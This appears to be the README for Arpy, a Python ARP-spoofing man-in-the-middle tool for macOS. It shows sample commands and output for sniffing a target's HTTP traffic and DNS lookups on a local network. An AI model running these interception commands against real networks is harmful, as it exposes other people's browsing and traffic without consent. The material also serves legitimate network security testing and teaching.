![alt text][logo]

[logo]: https://github.com/ivanvza/arpy/blob/master/images/logo.png "Logo"
# Arpy
Arpy is an easy-to-use [ARP](https://tools.ietf.org/html/rfc826) spoofing MiTM tool for Mac.
It provides 3 targeted functions:
* Packet Sniffing
* Visited Domains
* Visited Domains with [Gource](https://code.google.com/p/gource/)

###### Each function will be explained below.

### Tested OS (to date)
* Darwin 14.3.0 Darwin Kernel Version 14.3.0 (Mac OS X)

## Requirements
* Python 2.7
* Gource
* Scapy

## Installation
#### Gource
```
brew install gource
```
#### Scapy
```
pip install scapy
```

## Sample Commands
```
ivanvza:~/ > arpy
    _____
    |  _  |___ ___ _ _
    |     |  _| . | | |
    |__|__|_| |  _|_  |
    MiTM Tool |_| |___|
         - @viljoenivan

Usage: arpy -t <Target IP> -g <Gateway IP> -i <Interface>

ARP MiTM Tool

Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        The Target IP
  -g GATEWAY, --gateway=GATEWAY
                        The Gateway
  -i INTERFACE, --interface=INTERFACE
                        Interface to use
  --sniff               Sniff all passing data
  --sniff-dns           Sniff only searched domains
  --sniff-dns-gource    Output target's DNS searches in gource format
```

## Packet Sniff
This is the packet sniffer, it allows you to see your target's traffic.
```
ivanvza:~/ > sudo arpy -t 192.168.1.4 -g 192.168.1.1 -i en0 --sniff
    _____
    |  _  |___ ___ _ _
    |     |  _| . | | |
    |__|__|_| |  _|_  |
    MiTM Tool |_| |___|
         - @viljoenivan


  [Info] Starting Sniffer...

[Info] Enabling IP Forwarding...
[Info] Done...

[Info] Found the following (IP layer): 192.168.1.4 -> 216.58.223.10
GET /ajax/libs/jquery/1.7.1/jquery.min.js HTTP/1.1
Host: ajax.googleapis.com
Connection: keep-alive
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
X-Client-Data: CKW1yQEIjrbJAQimtskBCKm2yQEIxLbJAQjriMoBCLWJygEIs5TKAQ==
Referer: http://stackoverflow.com/
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8,af;q=0.6

[Info] Found the following (IP layer): 216.58.223.10 -> 192.168.1.4
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Type: text/javascript; charset=UTF-8
Last-Modified: Mon, 02 Apr 2012 18:24:28 GMT
Date: Mon, 18 May 2015 17:26:10 GMT
Expires: Tue, 17 May 2016 17:26:10 GMT
Access-Control-Allow-Origin: *
Timing-Allow-Origin: *
X-Content-Type-Options: nosniff
Server: sffe
Content-Length: 33186
X-XSS-Protection: 1; mode=block
Cache-Control: public, max-age=31536000
Age: 79137
Alternate-Protocol: 80:quic,p=0

�Ľ�~�F�.�?��ʫ�!J�ҷ
```
## DNS Sniff
This function allows you to see domain names that your target is currently requesting.
```
ivanvza:~/ > sudo arpy -t 192.168.1.4 -g 192.168.1.1 -i en0 --sniff-dns
    _____
    |  _  |___ ___ _ _
    |     |  _| . | | |
    |__|__|_| |  _|_  |
    MiTM Tool |_| |___|
         - @viljoenivan


  [Info] Starting DNS Sniffer...

[Info] Enabling IP Forwarding...
[Info] Done...
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: www.youtube.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: s2.googleusercontent.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: google.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: s.ytimg.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: fonts.gstatic.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: yt3.ggpht.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: i.ytimg.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: safebrowsing.google.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: safebrowsing-cache.google.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: safebrowsing-cache.google.com.
```
## DNS Sniff With Gource
This function is more or less the same as the above, however it provides the functionality to pass it through Gource to get a live feed of what your target is viewing.
```
ivanvza:~/ > sudo arpy -t 192.168.1.4 -g 192.168.1.1 -i en0 --sniff-dns-gource
WARNING: No route found for IPv6 destination :: (no default route?)
[INFO] For a live gource feed run this command in parallel with this one:

tail -f parsed_domain_gource | tee /dev/stderr | gource -log-format custom -a 1 --file-idle-time 0 -
```
### Sample Gource footage
![alt text][gourve_live_footage]

[gourve_live_footage]: https://github.com/ivanvza/arpy/blob/master/images/arpy_gource.gif "Live Gource Footage"

### Contact
@viljoenivan

### To-do
* Look at adding sslstrip.
* Filter sniff to a certain domain/IP.
* Port it too kali.
